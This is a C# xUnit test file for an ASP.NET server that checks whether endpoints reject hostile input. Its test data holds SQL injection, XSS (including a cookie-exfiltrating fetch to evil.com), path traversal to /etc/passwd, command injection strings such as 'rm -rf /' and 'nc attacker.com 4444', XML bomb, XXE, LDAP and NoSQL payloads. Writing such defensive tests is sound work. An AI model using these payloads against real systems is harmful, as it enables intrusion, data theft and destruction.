using System;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using FluentAssertions;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Mvc.Testing;
using Xunit;

namespace Honua.Server.Host.Tests.Security;

/// <summary>
/// Comprehensive input validation security tests covering SQL injection, XSS,
/// path traversal, command injection, XML/JSON bombs, and malformed data handling.
/// </summary>
[Collection("HostTests")]
[Trait("Category", "Security")]
public sealed class InputValidationSecurityTests : IClassFixture<WebApplicationFactory<Program>>
{
    private readonly WebApplicationFactory<Program> _factory;

    public InputValidationSecurityTests(WebApplicationFactory<Program> factory)
    {
        _factory = factory;
    }

    #region SQL Injection Tests

    [Theory]
    [InlineData("'; DROP TABLE users--")]
    [InlineData("1' OR '1'='1")]
    [InlineData("admin'--")]
    [InlineData("' OR 1=1--")]
    [InlineData("' UNION SELECT * FROM users--")]
    [InlineData("1'; DELETE FROM layers WHERE '1'='1")]
    [InlineData("' OR '1'='1' /*")]
    [InlineData("admin' OR '1'='1'--")]
    [InlineData("' UNION SELECT NULL, username, password FROM users--")]
    [InlineData("1' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))--")]
    public async Task SqlInjection_InQueryParameter_ReturnsError(string maliciousInput)
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act - Try SQL injection in various query parameters
        var response = await client.GetAsync($"/api/collections?name={Uri.EscapeDataString(maliciousInput)}");

        // Assert - Should reject or sanitize input
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.OK, // If properly sanitized
            HttpStatusCode.NotFound);
    }

    [Theory]
    [InlineData("'; DROP TABLE users--")]
    [InlineData("1' OR '1'='1")]
    [InlineData("' UNION SELECT * FROM features--")]
    [InlineData("admin'--")]
    public async Task SqlInjection_InRequestBody_ReturnsError(string maliciousInput)
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent(
            JsonSerializer.Serialize(new { name = maliciousInput, description = "test" }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/collections", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Theory]
    [InlineData("test'; EXEC xp_cmdshell('dir')--")]
    [InlineData("test' WAITFOR DELAY '00:00:05'--")]
    [InlineData("test'; SHUTDOWN--")]
    public async Task SqlInjection_CommandExecution_IsBlocked(string maliciousInput)
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync($"/api/features?filter={Uri.EscapeDataString(maliciousInput)}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.OK,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region XSS (Cross-Site Scripting) Tests

    [Theory]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("<img src=x onerror=alert('xss')>")]
    [InlineData("<svg/onload=alert('xss')>")]
    [InlineData("javascript:alert('xss')")]
    [InlineData("<iframe src='javascript:alert(\"xss\")'></iframe>")]
    [InlineData("<body onload=alert('xss')>")]
    [InlineData("<input onfocus=alert('xss') autofocus>")]
    [InlineData("<select onfocus=alert('xss') autofocus>")]
    [InlineData("<textarea onfocus=alert('xss') autofocus>")]
    [InlineData("<keygen onfocus=alert('xss') autofocus>")]
    [InlineData("<video><source onerror=\"alert('xss')\">")]
    [InlineData("<audio src=x onerror=alert('xss')>")]
    [InlineData("<details open ontoggle=alert('xss')>")]
    [InlineData("<marquee onstart=alert('xss')>")]
    [InlineData("'-alert('xss')-'")]
    [InlineData("\"><script>alert('xss')</script>")]
    public async Task XssInjection_InInput_IsSanitizedOrRejected(string maliciousInput)
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent(
            JsonSerializer.Serialize(new { title = maliciousInput, description = "test" }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/collections", content);

        // Assert - Should be rejected or sanitized
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);

        // If accepted, verify the response doesn't contain unsanitized script
        if (response.IsSuccessStatusCode)
        {
            var responseBody = await response.Content.ReadAsStringAsync();
            responseBody.Should().NotContain("<script>");
            responseBody.Should().NotContain("onerror=");
            responseBody.Should().NotContain("javascript:");
        }
    }

    [Theory]
    [InlineData("<script>document.cookie</script>")]
    [InlineData("<img src='x' onerror='fetch(\"https://evil.com?c=\"+document.cookie)'>")]
    [InlineData("<iframe src='data:text/html,<script>alert(document.cookie)</script>'>")]
    public async Task XssInjection_CookieStealing_IsBlocked(string maliciousInput)
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent(
            JsonSerializer.Serialize(new { description = maliciousInput }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/items", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region Path Traversal Tests

    [Theory]
    [InlineData("../../../etc/passwd")]
    [InlineData("..\\..\\..\\windows\\system32\\config\\sam")]
    [InlineData("....//....//....//etc/passwd")]
    [InlineData("..%2F..%2F..%2Fetc%2Fpasswd")]
    [InlineData("%2e%2e/%2e%2e/%2e%2e/etc/passwd")]
    [InlineData("..%252f..%252f..%252fetc%252fpasswd")]
    [InlineData("/etc/passwd")]
    [InlineData("C:\\Windows\\System32\\config\\sam")]
    [InlineData("\\\\server\\share\\file.txt")]
    [InlineData("file:///etc/passwd")]
    [InlineData("..;/..;/..;/etc/passwd")]
    [InlineData("..%00/..%00/etc/passwd")]
    public async Task PathTraversal_InFilePath_IsBlocked(string maliciousPath)
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync($"/api/files/{Uri.EscapeDataString(maliciousPath)}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.NotFound,
            HttpStatusCode.Forbidden);
    }

    [Theory]
    [InlineData("../../config/secrets.json")]
    [InlineData("../../../app/appsettings.json")]
    [InlineData("..\\..\\..\\app\\appsettings.json")]
    public async Task PathTraversal_ToConfigFiles_IsBlocked(string maliciousPath)
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync($"/api/download?path={Uri.EscapeDataString(maliciousPath)}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.NotFound,
            HttpStatusCode.Forbidden);
    }

    #endregion

    #region Command Injection Tests

    [Theory]
    [InlineData("test; ls -la")]
    [InlineData("test & dir")]
    [InlineData("test | cat /etc/passwd")]
    [InlineData("test && whoami")]
    [InlineData("test || rm -rf /")]
    [InlineData("test `cat /etc/passwd`")]
    [InlineData("test $(cat /etc/passwd)")]
    [InlineData("test; shutdown -h now")]
    [InlineData("test & del /f /q C:\\*.*")]
    [InlineData("test | nc attacker.com 4444")]
    public async Task CommandInjection_InParameter_IsBlocked(string maliciousInput)
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync($"/api/process?command={Uri.EscapeDataString(maliciousInput)}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.NotFound,
            HttpStatusCode.Forbidden);
    }

    #endregion

    #region XML Bomb / Billion Laughs Attack Tests

    [Fact]
    public async Task XmlBomb_BillionLaughsAttack_IsRejected()
    {
        // Arrange
        var client = _factory.CreateClient();
        var billionLaughs = @"<?xml version=""1.0""?>
<!DOCTYPE lolz [
  <!ENTITY lol ""lol"">
  <!ENTITY lol2 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"">
  <!ENTITY lol3 ""&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"">
  <!ENTITY lol4 ""&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"">
  <!ENTITY lol5 ""&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"">
  <!ENTITY lol6 ""&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"">
]>
<lolz>&lol6;</lolz>";

        var content = new StringContent(billionLaughs, Encoding.UTF8, "application/xml");

        // Act
        var response = await client.PostAsync("/api/xml/import", content);

        // Assert - Should reject XML bomb
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.RequestEntityTooLarge,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task XmlExternalEntity_IsBlocked()
    {
        // Arrange
        var client = _factory.CreateClient();
        var xxePayload = @"<?xml version=""1.0""?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM ""file:///etc/passwd"">
]>
<data>&xxe;</data>";

        var content = new StringContent(xxePayload, Encoding.UTF8, "application/xml");

        // Act
        var response = await client.PostAsync("/api/xml/import", content);

        // Assert - Should reject XXE
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region JSON Bomb Tests

    [Fact]
    public async Task JsonBomb_DeeplyNestedObject_IsRejected()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Create deeply nested JSON (1000+ levels)
        var deepJson = "{";
        for (int i = 0; i < 1000; i++)
        {
            deepJson += "\"a\":{";
        }
        deepJson += "\"value\":\"test\"";
        for (int i = 0; i < 1000; i++)
        {
            deepJson += "}";
        }
        deepJson += "}";

        var content = new StringContent(deepJson, Encoding.UTF8, "application/json");

        // Act
        var response = await client.PostAsync("/api/data", content);

        // Assert - Should reject or handle gracefully
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.RequestEntityTooLarge,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task JsonBomb_DeeplyNestedArray_IsRejected()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Create deeply nested array
        var deepArray = "[";
        for (int i = 0; i < 1000; i++)
        {
            deepArray += "[";
        }
        deepArray += "\"value\"";
        for (int i = 0; i < 1000; i++)
        {
            deepArray += "]";
        }
        deepArray += "]";

        var content = new StringContent(deepArray, Encoding.UTF8, "application/json");

        // Act
        var response = await client.PostAsync("/api/data", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.RequestEntityTooLarge,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region Oversized Payload Tests

    [Fact]
    public async Task OversizedPayload_10MB_IsHandledGracefully()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Create 10MB payload
        var largeData = new string('A', 10 * 1024 * 1024);
        var content = new StringContent(
            JsonSerializer.Serialize(new { data = largeData }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/data", content);

        // Assert - Should reject or handle based on limits
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.RequestEntityTooLarge,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task OversizedPayload_100MB_IsRejected()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Create 100MB payload
        var largeData = new string('B', 100 * 1024 * 1024);
        var content = new StringContent(
            JsonSerializer.Serialize(new { data = largeData }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/data", content);

        // Assert - Should definitely reject
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.RequestEntityTooLarge,
            HttpStatusCode.BadRequest,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Theory]
    [InlineData(1000)] // 1KB
    [InlineData(10000)] // 10KB
    [InlineData(100000)] // 100KB
    [InlineData(1000000)] // 1MB
    public async Task PayloadSizes_WithinLimits_AreAccepted(int size)
    {
        // Arrange
        var client = _factory.CreateClient();
        var data = new string('X', size);
        var content = new StringContent(
            JsonSerializer.Serialize(new { description = data }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/items", content);

        // Assert - Reasonable sizes should be accepted (or rejected for other reasons)
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Created,
            HttpStatusCode.BadRequest,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region Malformed Data Tests

    [Theory]
    [InlineData("{\"invalid json")]
    [InlineData("{key: 'value'}")]
    [InlineData("{'single': 'quotes'}")]
    [InlineData("{\"trailing\": \"comma\",}")]
    [InlineData("{\"unescaped\": \"quotes\"inside\"}")]
    [InlineData("null")]
    [InlineData("undefined")]
    [InlineData("")]
    [InlineData("   ")]
    public async Task MalformedJson_IsRejected(string malformedJson)
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent(malformedJson, Encoding.UTF8, "application/json");

        // Act
        var response = await client.PostAsync("/api/data", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.UnsupportedMediaType,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Theory]
    [InlineData("NaN")]
    [InlineData("Infinity")]
    [InlineData("-Infinity")]
    [InlineData("undefined")]
    public async Task InvalidJsonValues_AreRejected(string invalidValue)
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent(
            $"{{\"value\": {invalidValue}}}",
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/data", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task NullByteInjection_IsHandled()
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent(
            JsonSerializer.Serialize(new { name = "test\0injection" }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/collections", content);

        // Assert - Null bytes should be rejected or sanitized
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Theory]
    [InlineData("\u0000")] // Null
    [InlineData("\u0001")] // Start of heading
    [InlineData("\u0007")] // Bell
    [InlineData("\u001B")] // Escape
    [InlineData("\u007F")] // Delete
    public async Task ControlCharacters_InInput_AreHandled(string controlChar)
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent(
            JsonSerializer.Serialize(new { name = $"test{controlChar}name" }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/collections", content);

        // Assert - Control characters should be rejected or sanitized
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Fact]
    public async Task UnicodeNormalizationAttack_IsHandled()
    {
        // Arrange
        var client = _factory.CreateClient();

        // Unicode normalization attack: ℀ (U+2100) normalizes to "a/c"
        var content = new StringContent(
            JsonSerializer.Serialize(new { path = "test℀file" }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/files", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.Created,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    [Theory]
    [InlineData("AAAAAAAAAA...")] // Repeating pattern
    [InlineData("👨‍👩‍👧‍👦👨‍👩‍👧‍👦👨‍👩‍👧‍👦")] // Complex emoji sequences
    [InlineData("﷽﷽﷽﷽﷽")] // Arabic ligature that expands
    public async Task CompressionBombString_IsHandled(string potentialBomb)
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent(
            JsonSerializer.Serialize(new { data = potentialBomb }),
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/data", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.Created,
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region LDAP Injection Tests

    [Theory]
    [InlineData("*")]
    [InlineData("admin*")]
    [InlineData("*)(uid=*))(|(uid=*")]
    [InlineData("admin)(&(password=*))")]
    [InlineData("*)(objectClass=*)")]
    public async Task LdapInjection_InSearchFilter_IsBlocked(string maliciousInput)
    {
        // Arrange
        var client = _factory.CreateClient();

        // Act
        var response = await client.GetAsync($"/api/users/search?name={Uri.EscapeDataString(maliciousInput)}");

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.OK,
            HttpStatusCode.NotFound);
    }

    #endregion

    #region NoSQL Injection Tests

    [Theory]
    [InlineData("{\"$ne\": null}")]
    [InlineData("{\"$gt\": \"\"}")]
    [InlineData("{\"$where\": \"function() { return true; }\"}")]
    [InlineData("{\"$regex\": \".*\"}")]
    public async Task NoSqlInjection_InQuery_IsBlocked(string maliciousInput)
    {
        // Arrange
        var client = _factory.CreateClient();
        var content = new StringContent(
            $"{{\"filter\": {maliciousInput}}}",
            Encoding.UTF8,
            "application/json");

        // Act
        var response = await client.PostAsync("/api/query", content);

        // Assert
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.BadRequest,
            HttpStatusCode.UnprocessableEntity,
            HttpStatusCode.Unauthorized,
            HttpStatusCode.Forbidden,
            HttpStatusCode.NotFound);
    }

    #endregion
}
